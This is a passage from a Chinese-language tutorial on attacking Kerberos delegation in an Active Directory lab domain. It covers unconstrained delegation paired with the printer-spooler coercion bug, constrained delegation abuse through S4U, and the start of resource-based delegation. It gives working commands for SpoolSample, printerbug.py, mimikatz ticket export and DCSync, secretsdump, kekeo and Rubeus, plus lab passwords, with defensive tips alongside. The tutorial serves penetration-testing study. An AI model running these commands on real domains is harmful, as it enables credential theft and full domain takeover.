+<h3 id="9-4-攻击者视角与目标设定（基于当前环境）"><a href="#9-4-攻击者视角与目标设定（基于当前环境）" class="headerlink" title="9.4 攻击者视角与目标设定（基于当前环境）"></a>9.4 攻击者视角与目标设定（基于当前环境）</h3><p>在构建的域环境（REDTEAM）中，<strong>12server1</strong>、<strong>12server2</strong> 两台成员服务器均配置了非约束委派，且普通域用户 <strong>web</strong> 也设置了非约束委派（密码 <code>123456</code>）。这种多委派主体的环境为攻击者提供了多个潜在的攻击切入点。以下是攻击者在复现非约束委派攻击时应当假定的信息及可达成的目标：</p>
+<h4 id="9-4-1-攻击者假设掌握的信息"><a href="#9-4-1-攻击者假设掌握的信息" class="headerlink" title="9.4.1 攻击者假设掌握的信息"></a>9.4.1 攻击者假设掌握的信息</h4><ul>
+<li><strong>初始立足点</strong>：假设攻击者已通过某种方式（如漏洞利用、弱口令、社会工程学等）获得了以下至少一种权限：<ul>
+<li>某台委派主机的<strong>本地管理员权限</strong>，例如已控制 <code>12server2</code>（本地管理员密码 <code>123456</code>）或 <code>12server1</code>（本地管理员密码 <code>456789</code>）。</li>
+<li>某个域用户的<strong>明文密码或 NTLM 哈希</strong>，如普通用户 <code>hack</code> 或 <code>test</code>（密码均为 <code>pass@123</code>），或配置了非约束委派的用户 <code>web</code>（密码 <code>123456</code>）。</li>
+</ul>
+</li>
+<li><strong>域内委派信息</strong>：通过前期信息收集（如 BloodHound、AdFind）已知：<ul>
+<li><code>12server1$</code> 和 <code>12server2$</code> 的计算机账号启用了非约束委派。</li>
+<li>域用户 <code>web</code> 也启用了非约束委派（可能作为服务账号，注册了 SPN）。</li>
+</ul>
+</li>
+<li><strong>可选信息</strong>：可能已知域管理员 <code>Administrator</code> 或其他高权限用户的登录习惯（例如经常登录某台委派主机）。</li>
+</ul>
+<h4 id="9-4-2-可能的攻击切入点"><a href="#9-4-2-可能的攻击切入点" class="headerlink" title="9.4.2 可能的攻击切入点"></a>9.4.2 可能的攻击切入点</h4><ul>
+<li><strong>直接利用已控主机的委派属性</strong>：若已控制 <code>12server2</code>（或 <code>12server1</code>），则只需等待或诱导域管理员（<code>REDTEAM\Administrator</code>）登录该主机，即可捕获其 TGT——该票据被缓存到了目标主机的 LSASS 进程内存中。</li>
+<li><strong>横向移动至另一台委派主机</strong>：若管理员更常登录 <code>12server1</code> 而攻击者仅控制 <code>12server2</code>，可尝试利用现有权限横向移动到 <code>12server1</code>，再捕获 TGT。</li>
+<li><strong>利用配置了委派的用户账号</strong>：若已获得用户 <code>web</code> 的凭据，可尝试在其运行服务的机器上（或伪造服务）诱导高权限用户访问，从而捕获 TGT。此路径相对复杂，但仍属攻击面之一。</li>
+<li><strong>结合其他漏洞强制高权限机器回连</strong>：若管理员长期不登录委派主机，可考虑使用打印机漏洞（SpoolSample）等强制域控制器向已控的委派主机发起认证，从而获得域控机器账户的 TGT，并利用其 DCSync 权限导出域哈希。</li>
+</ul>
+<h4 id="9-4-3-攻击者可达到的目的"><a href="#9-4-3-攻击者可达到的目的" class="headerlink" title="9.4.3 攻击者可达到的目的"></a>9.4.3 攻击者可达到的目的</h4><ul>
+<li><strong>短期目标</strong>：获取域管理员 <code>Administrator</code>（或至少一个高权限域用户）的 TGT，并利用该 TGT 模拟其身份。</li>
+<li><strong>中期目标</strong>：以域管理员权限访问域内关键资源，例如：<ul>
+<li>访问域控制器的文件共享（<code>\\DC1\c$</code>）。</li>
+<li>使用 Mimikatz 的 <code>lsadump::dcsync</code> 导出域内所有用户的哈希，包括 krbtgt 账户。</li>
+</ul>
+</li>
+<li><strong>最终目标</strong>：完全控制整个域环境，例如：<ul>
+<li>创建新的域管理员账号。</li>
+<li>部署持久化后门（如黄金票据、Skeleton Key）。</li>
+<li>窃取敏感数据或破坏域基础架构。</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-4-4-普通域用户登录场景下的价值与利用"><a href="#9-4-4-普通域用户登录场景下的价值与利用" class="headerlink" title="9.4.4 普通域用户登录场景下的价值与利用"></a>9.4.4 普通域用户登录场景下的价值与利用</h4><p>如果登录攻击者控制的主机（如 <code>12server2</code>）的用户是普通域用户（例如 <code>hack</code> 或 <code>test</code>），而非域管理员，攻击者仍然可以捕获其 TGT，并且该 TGT 在攻击链中具有重要价值：</p>
+<ul>
+<li><strong>身份模拟与横向移动</strong>：利用该 TGT 可以完全模拟该普通用户，进而以该用户的身份在域内进行信息收集、访问其有权限的资源。通过 BloodHound 等工具分析该用户的权限，可能发现它对其他机器（如 <code>12server1</code>）拥有本地管理员权限，或属于某个可远程登录到其他服务器的组。此时，攻击者可以使用该用户的 TGT 向域控请求访问目标机器的服务票据（如 CIFS、HOST），从而<strong>横向移动</strong>到那些机器，扩大控制范围。</li>
+<li><strong>权限提升的跳板</strong>：控制更多机器后，攻击者有机会捕获更高权限用户（如域管理员）的 TGT，或者找到提权路径（例如通过该用户对某些 ACL 的写入权限）。因此，即使是普通用户的 TGT，也是攻击链中“立足→横向移动→权限提升”的关键一环，绝非无用。</li>
+<li><strong>具体操作示例</strong>：<ul>
+<li>在 <code>12server2</code> 上导出普通用户 <code>hack</code> 的 TGT。</li>
+<li>注入该 TGT 到当前会话，然后尝试访问 <code>12server1</code> 的 CIFS 服务：<code>dir \\12server1\c$</code>。</li>
+<li>如果 <code>hack</code> 在 <code>12server1</code> 上有本地管理员权限，攻击者就可以进一步在 <code>12server1</code> 上执行命令，甚至部署持久化后门。</li>
+</ul>
+</li>
+</ul>
+<p>通过以上方式，攻击者可以利用任何登录委派主机的用户凭证，逐步扩大战果，最终可能获取域管理员权限。因此，非约束委派攻击的威力在于“捕获一切经过的用户”，无论其权限高低。</p>
+<h3 id="9-5-非约束委派结合打印机漏洞（Spooler）攻击"><a href="#9-5-非约束委派结合打印机漏洞（Spooler）攻击" class="headerlink" title="9.5 非约束委派结合打印机漏洞（Spooler）攻击"></a>9.5 非约束委派结合打印机漏洞（Spooler）攻击</h3><h4 id="9-5-1-前置条件"><a href="#9-5-1-前置条件" class="headerlink" title="9.5.1 前置条件"></a>9.5.1 前置条件</h4><p>在实施该攻击前，必须满足以下条件：</p>
+<ul>
+<li><strong>已控委派主机</strong>：攻击者已获得一台开启了非约束委派的服务器（如 <code>12server2</code>）的本地管理员权限，能够执行命令、上传工具并从 LSASS 进程中导出 Kerberos 票据。</li>
+<li><strong>域内高权限目标</strong>：存在一台可被强制触发认证的高权限机器，通常为域控制器（DC1），且该机器未配置“敏感且不能被委派”保护（默认情况下域控机器账户未受保护）。</li>
+<li><strong>打印服务可用</strong>：目标机器（如 DC1）的 Print Spooler 服务必须处于运行状态（Windows 默认开启），且攻击者能够通过网络访问其 RPC 接口（通常域内默认允许经过身份验证的用户调用）。</li>
+<li><strong>有效域凭据</strong>：攻击者需要拥有至少一个有效的域用户账号（如 <code>hack</code>、<code>test</code> 或更高级别的账号）来触发 SpoolSample 漏洞，因为该漏洞利用需要经过身份验证的 RPC 调用。即使该用户权限很低，只要能够通过身份验证即可。</li>
+<li><strong>网络连通性</strong>：攻击者可以从其控制的机器（或通过已控主机）与目标域控、委派主机之间建立网络连接，且防火墙未阻断必要的 RPC 流量。</li>
+</ul>
+<h4 id="9-5-2-原理概述"><a href="#9-5-2-原理概述" class="headerlink" title="9.5.2 原理概述"></a>9.5.2 原理概述</h4><p>打印机漏洞（SpoolSample，也称为“打印机Bug”）利用了 Windows 打印系统远程协议（MS-RPRN）的一个功能：任何经过身份验证的用户都可以远程强制另一台机器（通常为域控制器）向任意第三台机器发起 Kerberos 或 NTLM 认证。结合非约束委派，如果攻击者控制了一台开启了非约束委派的主机（如 <code>12server2</code>），并强制域控制器（DC1）向该主机进行认证，那么域控制器在认证过程中会将自身的 TGT 发送给 <code>12server2</code>，并缓存于其 LSASS 内存中。攻击者随后可导出该 TGT，进而模拟域控制器机器账户。</p>
+<p>虽然机器账户的权限通常低于域管理员，但在特定条件下（例如域控制器机器账户默认具有 DCSync 权限），攻击者可利用该 TGT 导出域内所有用户哈希，从而实现与域管理员等效的控制。</p>
+<h4 id="9-5-3-攻击流程"><a href="#9-5-3-攻击流程" class="headerlink" title="9.5.3 攻击流程"></a>9.5.3 攻击流程</h4><p>下图展示了基于当前环境的非约束委派 + Spooler 攻击流程：</p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_5.png" alt="在这里插入图片描述"></p>
+<h4 id="9-5-4-攻击步骤详细说明"><a href="#9-5-4-攻击步骤详细说明" class="headerlink" title="9.5.4 攻击步骤详细说明"></a>9.5.4 攻击步骤详细说明</h4><ol>
+<li><strong>准备阶段</strong>：确保所有前置条件已满足。攻击者已在 <code>12server2</code> 上获得本地管理员权限，并验证其非约束委派属性已开启。同时，确认域控 DC1 的 Print Spooler 服务正在运行（默认状态）。</li>
+<li><strong>触发漏洞</strong>：攻击者在某台域内机器（可以是 <code>12server2</code> 自身，也可以是其他如 <code>12server1</code> 或通过已控主机远程执行）上运行 SpoolSample 漏洞利用程序，强制域控制器 DC1 向攻击者控制的主机 <code>12server2</code> 发起认证。常用工具包括 <code>SpoolSample.exe</code>（Windows）或 <code>printerbug.py</code>（Impacket）。命令示例：<ul>
+<li>Windows: <code>SpoolSample.exe DC1 12server2</code></li>
+<li>Linux (Impacket): <code>python3 printerbug.py redteam/hack:pass@123@DC1 12server2</code></li>
+</ul>
+</li>
+<li><strong>认证与 TGT 下发</strong>：DC1 收到触发后，会向 <code>12server2</code> 发起 Kerberos 认证请求。由于 <code>12server2</code> 配置了非约束委派，域控在认证过程中会将自身（DC1$）的 TGT 附带发送给 <code>12server2</code>，并缓存于其 LSASS 内存中。</li>
+<li><strong>导出 TGT</strong>：攻击者在 <code>12server2</code> 上使用 mimikatz 或 Rubeus 导出所有缓存的 Kerberos 票据，重点关注包含 <code>krbtgt</code> 且客户端为 <code>DC1$</code> 的票据文件。<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+导出的文件示例：<code>[0;12d40]-2-0-60a10000-DC1$@krbtgt-REDTEAM.COM.kirbi</code>。</li>
+<li><strong>注入票据</strong>：将导出的 TGT 注入当前会话，获得域控机器账户的身份：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt DC1$.kirbi</span><br></pre></td></tr></table></figure></li>
+<li><strong>利用机器账户权限</strong>：由于域控制器机器账户（DC1$）默认具有 DCSync 权限（可复制域数据库），攻击者可利用该 TGT 执行 DCSync 攻击，导出所有域用户哈希：<ul>
+<li>使用 mimikatz：<code>lsadump::dcsync /domain:redteam.club /all /csv</code></li>
+<li>或通过 impacket 的 <code>secretsdump.py</code>（Impacket工具）远程导出（需将票据转换为 ccache 格式）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=DC1$.ccache</span><br><span class="line">python3 secretsdump.py -k -no-pass DC1.redteam.club -just-dc-user administrator</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><strong>完全控制</strong>：获得域管理员哈希后，可进一步通过哈希传递、黄金票据等手段完全控制域。</li>
+</ol>
+<h4 id="9-5-5-注意事项"><a href="#9-5-5-注意事项" class="headerlink" title="9.5.5 注意事项"></a>9.5.5 注意事项</h4><ul>
+<li>该攻击不依赖域管理员主动登录委派主机，而是通过漏洞强制高权限机器（域控）主动连接，因此即使管理员从未登录过委派主机，攻击者仍可能获得域控机器账户的 TGT。</li>
+<li>机器账户的 TGT 有效期通常为 10 小时，攻击者需在此时间内完成利用。</li>
+<li>域控机器账户默认具有 DCSync 权限，这是该攻击能够直接导出域哈希的关键。如果目标机器不是域控，则机器账户的 TGT 可能价值较低，但仍可用于横向移动。</li>
+<li>某些高级安全配置（如将域控加入“Protected Users”组或设置“账户敏感且不能被委派”）可阻止此类攻击，但默认环境中通常未启用。</li>
+<li>触发 SpoolSample 漏洞时，攻击者使用的域用户凭据可以是普通用户，无需高权限，因为 MS-RPRN 的调用仅需身份验证即可。</li>
+</ul>
+<h3 id="9-6-防御提示"><a href="#9-6-防御提示" class="headerlink" title="9.6 防御提示"></a>9.6 防御提示</h3><blockquote>
+<ul>
+<li>避免将服务器设置为非约束委派，尤其是面向管理员频繁登录的机器。  </li>
+<li>启用“受保护的用户”组或设置敏感用户为“敏感且不能被委派”。  </li>
+<li>监控事件 ID 4624（登录）和 4769（Kerberos 服务票据请求）以发现异常委派行为。  </li>
+<li>针对打印机漏洞，可禁用 Print Spooler 服务（如果不需要），或通过组策略限制远程打印操作。  </li>
+<li>将域控制器等关键机器加入“受保护的用户”组，或设置“账户敏感且不能被委派”属性，以防止机器账户被用于委派攻击。  </li>
+<li>实施最小权限原则，定期检查并清理不必要的委派配置。</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="十、约束委派详解"><a href="#十、约束委派详解" class="headerlink" title="十、约束委派详解"></a>十、约束委派详解</h2><p><strong>说明</strong>：本节涉及的攻击主体是配置了约束委派的用户 <code>websec</code>。成员服务器 <code>12server1</code> 和 <code>12server2</code> <strong>并未开启约束委派</strong>，它们只是作为潜在的目标服务主机（例如域控或其他服务器）被访问。约束委派攻击不依赖于这些主机的委派属性，而是利用 <code>websec</code> 账号的凭据和委派配置来模拟高权限用户访问指定服务。</p>
+<h3 id="10-1-设计初衷"><a href="#10-1-设计初衷" class="headerlink" title="10.1 设计初衷"></a>10.1 设计初衷</h3><p>约束委派（Constrained Delegation）是在 Windows Server 2003 中引入的，旨在解决非约束委派的安全缺陷。非约束委派允许服务模拟用户访问任何服务，一旦服务被攻陷，攻击者可获得所有访问过该服务的用户的 TGT，风险极大。约束委派通过限制服务可以模拟用户访问的<strong>具体服务</strong>（即 SPN），缩小了委派的范围，提高了安全性。</p>
+<p>在约束委派中，域管理员可以显式配置某个服务账号（如 Web 服务）只能代表用户访问特定的后端服务（如文件服务器、数据库），而不能访问任意服务。即使该服务被攻陷，攻击者也只能模拟用户访问预先指定的服务，无法获取用户的 TGT 或模拟用户访问其他未授权的服务。</p>
+<h3 id="10-2-工作原理"><a href="#10-2-工作原理" class="headerlink" title="10.2 工作原理"></a>10.2 工作原理</h3><p>约束委派依赖于两个 Kerberos 扩展协议：<strong>S4U2Self</strong>（Service for User to Self）和 <strong>S4U2Proxy</strong>（Service for User to Proxy）。</p>
+<ul>
+<li><strong>S4U2Self</strong>：允许服务代表任意用户向 KDC 请求一个可转发的服务票据（ST1），用于自身。即使该用户尚未通过 Kerberos 向此服务进行过认证，服务也能获取该用户的票据。这解决了某些协议（如 HTTP）无法直接获得用户票据的问题。</li>
+<li><strong>S4U2Proxy</strong>：在服务获得用户的 ST1 后，它可以使用该 ST1 向 KDC 请求一个用于访问特定目标服务（在委派列表中指定）的服务票据（ST2）。KDC 验证 ST1 中的用户身份，并检查服务账号是否被允许委派给目标服务，若允许则返回 ST2。</li>
+</ul>
+<p>约束委派的整体流程如下：</p>
+<ol>
+<li>用户通过某种方式（如 Kerberos 或 NTLM）向服务 A 发起请求。</li>
+<li>服务 A 需要代表用户访问后端服务 B。如果用户尚未通过 Kerberos 认证到服务 A，服务 A 可调用 S4U2Self 向 KDC 请求一个针对自身的用户票据（ST1）。</li>
+<li>服务 A 获得 ST1 后，调用 S4U2Proxy，使用 ST1 向 KDC 请求访问服务 B 的票据（ST2）。</li>
+<li>KDC 检查服务 A 的 msDS-AllowedToDelegateTo 属性，确认其是否允许委派给服务 B 的 SPN。若允许，则返回 ST2。</li>
+<li>服务 A 使用 ST2 访问服务 B，服务 B 认为请求来自原始用户。</li>
+</ol>
+<p>关键点是：服务 A <strong>从未获得用户的 TGT</strong>，只能获得用于特定目标服务的 ST2。这大大限制了攻击者滥用服务账号的后果。</p>
+<p>下图展示了约束委派的正常流程：</p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_6.png" alt="在这里插入图片描述"></p>
+<h3 id="10-3-关于-ST1-与-ST2-的说明"><a href="#10-3-关于-ST1-与-ST2-的说明" class="headerlink" title="10.3 关于 ST1 与 ST2 的说明"></a>10.3 关于 ST1 与 ST2 的说明</h3><p>在约束委派的描述中，我们使用了 <strong>ST1</strong> 和 <strong>ST2</strong> 来区分两个不同阶段获得的票据，它们本质上都是服务票据（TGS），但用途和属性有所区别：</p>
+<table>
+<thead>
+<tr>
+<th>术语</th>
+<th>获取方式</th>
+<th>用途</th>
+<th>是否可转发</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ST</td>
+<td>普通 Kerberos</td>
+<td>客户端直接向 KDC 请求，用于访问指定服务。</td>
+<td>通常不可转发</td>
+<td>在非约束委派中，服务票据（ST）与 TGT 一起下发给服务。</td>
+</tr>
+<tr>
+<td>ST1</td>
+<td>S4U2Self</td>
+<td>服务代表用户向 KDC 请求的针对服务自身的票据，用于证明用户正在访问该服务。</td>
+<td>必须是可转发的</td>
+<td>这是 S4U2Proxy 的前提，其可转发属性允许后续转换为其他服务的票据。</td>
+</tr>
+<tr>
+<td>ST2</td>
+<td>S4U2Proxy</td>
+<td>服务使用 ST1 向 KDC 请求的针对目标服务（在委派列表中）的票据，用于实际访问后端服务。</td>
+<td>通常是可转发的</td>
+<td>最终用于访问后端服务的票据，与普通 ST 功能相同，但来源不同。</td>
+</tr>
+</tbody></table>
+<p><strong>关键区别</strong>：</p>
+<ul>
+<li>普通 ST 是客户端主动请求的，而 ST1 和 ST2 是由服务代表用户请求的。</li>
+<li>ST1 必须是可转发的，因为 S4U2Proxy 需要这个属性来生成 ST2。</li>
+<li>约束委派的整个过程中，服务从未接触用户的 TGT，这是与非约束委派的本质区别。</li>
+</ul>
+<h3 id="10-4-攻击流程"><a href="#10-4-攻击流程" class="headerlink" title="10.4 攻击流程"></a>10.4 攻击流程</h3><p>约束委派本身比非约束委派安全，但如果攻击者获得了配置了约束委派的服务账号的<strong>明文密码或 NTLM 哈希</strong>，就可以伪造 S4U 请求，以任意用户（如域管理员）的身份请求访问该服务被允许委派的目标服务。</p>
+<p>攻击步骤概述：</p>
+<ol>
+<li>攻击者通过某种方式（如密码喷洒、哈希传递、内存转储）获得配置了约束委派的服务账号（例如 <code>websec</code>）的密码或 NTLM 哈希。</li>
+<li>使用该服务账号的凭据请求其 TGT（例如使用 <code>kekeo</code> 或 <code>Rubeus</code> 的 <code>asktgt</code>）。</li>
+<li>利用该服务账号的 TGT，通过 S4U2Self 请求以任意高权限用户（如 <code>Administrator</code>）针对该服务自身的票据（ST1）。此步骤相当于“证明”该用户正在访问服务。</li>
+<li>然后使用 S4U2Proxy，将 ST1 转换为针对允许委派的目标服务（如 <code>cifs/DC1.redteam.club</code>）的票据（ST2）。</li>
+<li>将获得的 ST2 注入会话，即可直接访问目标服务。</li>
+</ol>
+<p>该攻击无需高权限用户实际登录，只要攻击者有服务账号的凭据，就能模拟任意用户访问被允许的后端服务。</p>
+<p>下图展示了约束委派攻击流程：</p>
+<p><img src="/images/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%9F%9F%E6%83%85%E5%86%B5/image_7.png" alt="在这里插入图片描述"></p>
+<h4 id="攻击步骤详细说明"><a href="#攻击步骤详细说明" class="headerlink" title="攻击步骤详细说明"></a>攻击步骤详细说明</h4><ol>
+<li><strong>获取服务账号凭据</strong>：攻击者通过密码猜测、内存读取、域控导出等方式获得配置了约束委派的服务账号（例如 <code>websec</code>）的明文密码或 NTLM 哈希。在环境中，<code>websec</code> 用户已设置约束委派，密码为 <code>123456</code>，并已注册 SPN：<code>cifs/12server2.redteam.club</code>。假设其委派配置允许委派给 <code>cifs/DC1.redteam.club</code>（即域控的文件共享服务）。</li>
+<li><strong>请求服务账号 TGT</strong>：使用工具请求该服务账号的 TGT。例如用 <code>kekeo</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:websec /domain:redteam.club /password:123456 /ticket:websec.kirbi</span><br></pre></td></tr></table></figure>
+或用 <code>Rubeus</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:websec /password:123456 /domain:redteam.club /dc:DC1.redteam.club /ptt</span><br></pre></td></tr></table></figure></li>
+<li><strong>模拟任意用户进行 S4U2Self</strong>：利用服务账号的 TGT，向 KDC 请求以任意用户（如 <code>Administrator</code>）访问服务自身的票据（ST1）。此步骤使用 <code>tgs::s4u</code>（kekeo）或 Rubeus 的 <code>s4u</code> 模块。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:websec.kirbi /user:Administrator@redteam.club /service:cifs/DC1.redteam.club</span><br></pre></td></tr></table></figure>
+此处 <code>/service</code> 指定目标服务 SPN（注意：在 S4U2Self 阶段，实际请求的应该是服务自身的 SPN，但工具会自动处理；通常直接指定最终目标 SPN 即可，工具会先请求服务自身的票据然后转换）。</li>
+<li><strong>获得目标服务票据 ST2</strong>：上一步如果成功，工具会生成用于访问指定服务的 ST2（例如 <code>cifs/DC1.redteam.club</code>）。文件名如 <code>TGS_Administrator@redteam.club@REDTEAM.CLUB_cifs~DC1.redteam.club.kirbi</code>。</li>
+<li><strong>注入票据并访问</strong>：使用 <code>kerberos::ptt</code> 将 ST2 注入当前会话，然后尝试访问目标服务：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC1\c$</span><br></pre></td></tr></table></figure>
+如果目标服务允许，攻击者即可模拟域管理员访问域控的文件共享，进而可尝试导出哈希（若获得 <code>cifs</code> 票据，可直接通过文件共享操作，但 DCSync 需要额外的 <code>ldap</code> 票据，需根据委派配置调整）。</li>
+</ol>
+<p><strong>注意</strong>：约束委派攻击的关键限制是只能访问<strong>预配置的目标服务</strong>。如果配置的委派目标是 <code>cifs/DC1</code>，则攻击者可获得域控的文件共享访问；如果目标是 <code>ldap/DC1</code>，则可利用 DCSync。因此，攻击者需要提前了解服务账号的委派配置。</p>
+<h3 id="10-5-攻击者视角与目标设定（基于当前环境）"><a href="#10-5-攻击者视角与目标设定（基于当前环境）" class="headerlink" title="10.5 攻击者视角与目标设定（基于当前环境）"></a>10.5 攻击者视角与目标设定（基于当前环境）</h3><p>在当前 REDTEAM 环境中，域用户 <code>websec</code> 已配置了约束委派（例如允许委派给 <code>cifs/DC1.redteam.club</code>）。攻击者可能通过以下信息规划攻击：</p>
+<h4 id="10-5-1-攻击者假设掌握的信息"><a href="#10-5-1-攻击者假设掌握的信息" class="headerlink" title="10.5.1 攻击者假设掌握的信息"></a>10.5.1 攻击者假设掌握的信息</h4><ul>
+<li><strong>服务账号凭据</strong>：攻击者已获得 <code>websec</code> 用户的明文密码（<code>123456</code>）或其 NTLM 哈希。</li>
+<li><strong>委派配置</strong>：通过 BloodHound 或 AdFind 查询得知 <code>websec</code> 用户配置了约束委派，且 <code>msDS-AllowedToDelegateTo</code> 属性中包含感兴趣的 SPN，例如 <code>cifs/DC1.redteam.club</code> 或 <code>ldap/DC1.redteam.club</code>。</li>
+<li><strong>域内信息</strong>：已知域控制器 DC1 的地址，以及目标服务（如文件共享、LDAP）的 SPN 格式。</li>
+</ul>
+<h4 id="10-5-2-攻击切入点"><a href="#10-5-2-攻击切入点" class="headerlink" title="10.5.2 攻击切入点"></a>10.5.2 攻击切入点</h4><ul>
+<li><strong>直接模拟高权限用户访问委派服务</strong>：利用 <code>websec</code> 的凭据，通过 S4U2Proxy 模拟域管理员，获取访问目标服务（如 DC1 的文件共享）的票据，进而横向移动或权限提升。</li>
+<li><strong>若委派包含 <code>ldap</code> 服务</strong>：可请求 LDAP 票据，进而使用 DCSync 导出所有哈希，直接获得域控权限。</li>
+<li><strong>若委派包含其他机器服务</strong>：可模拟管理员访问该机器的 CIFS、HOST 等服务，实现远程代码执行。</li>
+</ul>
+<h4 id="10-5-3-攻击者可达到的目的"><a href="#10-5-3-攻击者可达到的目的" class="headerlink" title="10.5.3 攻击者可达到的目的"></a>10.5.3 攻击者可达到的目的</h4><ul>
+<li><strong>短期目标</strong>：获得目标服务的访问权限（如读取域控文件）。</li>
+<li><strong>中期目标</strong>：若目标服务为 LDAP，可利用 DCSync 导出域哈希，进而制作黄金票据或直接哈希传递。</li>
+<li><strong>最终目标</strong>：完全控制域环境。</li>
+</ul>
+<h4 id="10-5-4-与其他攻击的关联"><a href="#10-5-4-与其他攻击的关联" class="headerlink" title="10.5.4 与其他攻击的关联"></a>10.5.4 与其他攻击的关联</h4><p>约束委派攻击常被用作权限维持手段：攻击者获得一个服务账号后，即使其权限不高，但若该账号配置了到高价值服务的委派，就可直接提升权限。此外，约束委派也常用于跨域信任攻击。</p>
+<h3 id="10-6-防御提示"><a href="#10-6-防御提示" class="headerlink" title="10.6 防御提示"></a>10.6 防御提示</h3><ul>
+<li><strong>严格限制服务账号的委派权限</strong>：仅授予必要的目标 SPN，避免授予高权限服务（如 <code>ldap/DC</code>）。</li>
+<li><strong>保护服务账号凭据</strong>：使用强密码，定期更换，避免将密码存储在脚本或配置文件中。</li>
+<li><strong>启用“敏感且不能被委派”</strong>：对高权限用户（如域管理员）启用此属性，防止被服务账号模拟。</li>
+<li><strong>监控异常 S4U 请求</strong>：关注事件 ID 4769（Kerberos 服务票据请求），特别是包含 S4U2Self 或 S4U2Proxy 信息的请求。</li>
+<li><strong>定期审计委派配置</strong>：使用工具扫描域内所有配置了委派的服务账号，评估风险。</li>
+</ul>
+<hr>
+<h2 id="十一、基于资源的约束委派详解"><a href="#十一、基于资源的约束委派详解" class="headerlink" title="十一、基于资源的约束委派详解"></a>十一、基于资源的约束委派详解</h2><p><strong>说明</strong>：基于资源的约束委派（Resource-Based Constrained Delegation，RBCD）是 Windows Server 2012 引入的新特性，它将委派的配置权限从服务账号转移到了资源本身。这意味着资源（如计算机）可以自己决定哪些账号可以委派给它。攻击者如果拥有对目标计算机的写权限（如通过加入域的账号），就可以配置 RBCD，从而模拟任意用户（如域管理员）访问该计算机。</p>
+<p><strong>关于 Impacket 工具包</strong>：本节的复现案例中大量使用了 Impacket 工具集。Impacket 是一套用于网络协议交互的 Python 工具集，常用于渗透测试中与 Windows 域、SMB、LDAP 等服务进行交互。主要脚本包括 <code>addcomputer.py</code>（添加机器账号）、<code>ntlmrelayx.py</code>（NTLM 中继）、<code>printerbug.py</code>（打印机漏洞触发）、<code>getTGT.py</code>（请求 TGT）、<code>getST.py</code>（请求服务票据）、<code>secretsdump.py</code>（导出域哈希）、<code>smbexec.py</code>（远程命令执行）、<code>rbcd.py</code>（配置 RBCD）等。以下复现中将标注每个脚本的来源，并在命令后添加注释以便复习。</p>
+<h3 id="11-1-设计初衷"><a href="#11-1-设计初衷" class="headerlink" title="11.1 设计初衷"></a>11.1 设计初衷</h3><p>传统的约束委派需要域管理员权限在服务账号上配置 <code>msDS-AllowedToDelegateTo</code> 属性，这在大型环境中管理复杂且权限集中。RBCD 允许资源管理员（通常是计算机自身或将其加入域的用户）直接在计算机对象上配置 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性，指定哪些账号可以代表其他用户访问该计算机。这降低了委派配置的门槛，但也引入了新的攻击面。</p>
+<h3 id="11-2-工作原理"><a href="#11-2-工作原理" class="headerlink" title="11.2 工作原理"></a>11.2 工作原理</h3><p>RBCD 同样使用 S4U2Self 和 S4U2Proxy 协议，但区别在于委派检查的对象：</p>
+<ul>
+<li>在传统约束委派中，KDC 检查<strong>服务账号</strong>的 <code>msDS-AllowedToDelegateTo</code> 属性是否允许委派给目标 SPN。</li>
+<li>在 RBCD 中，KDC 检查<strong>目标计算机</strong>的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性是否允许发起委派的账号（即服务账号）代表用户访问自己。</li>
+</ul>
+<p>具体流程：</p>
+<ol>
+<li>攻击者控制一个账号（如机器账号 <code>hack2026$</code>），该账号需要对目标计算机（如 <code>DC1$</code>）具有写权限，以便修改其 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性。</li>
+<li>攻击者将该账号的 SID 添加到目标计算机的 RBCD 列表中。</li>
+<li>攻击者使用该账号的 TGT，通过 S4U2Self 请求以任意高权限用户（如 <code>Administrator</code>）针对该账号自身的票据（ST1）。</li>
+<li>然后使用 S4U2Proxy，将 ST1 转换为针对目标计算机的任意服务（如 <code>cifs/DC1</code>）的票据（ST2）。</li>
+<li>将 ST2 注入会话，即可访问目标计算机。</li>
+</ol>
+<p>关键点：RBCD 不要求服务账号本身有任何委派属性，只要目标计算机信任该账号即可。</p>
+<h3 id="11-3-攻击流程（复现案例）"><a href="#11-3-攻击流程（复现案例）" class="headerlink" title="11.3 攻击流程（复现案例）"></a>11.3 攻击流程（复现案例）</h3><p>在 REDTEAM 环境中，普通域用户 <code>hack</code> 可以将计算机加入域，因此对加入的计算机默认具有 <code>mS-DS-CreatorSID</code> 属性，即拥有对该计算机的写权限。利用这一点，攻击者可以创建新的机器账号（或使用已有账号），然后配置 RBCD 以访问域控或其他目标。</p>
+<h4 id="11-3-1-前置条件"><a href="#11-3-1-前置条件" class="headerlink" title="11.3.1 前置条件"></a>11.3.1 前置条件</h4><ul>
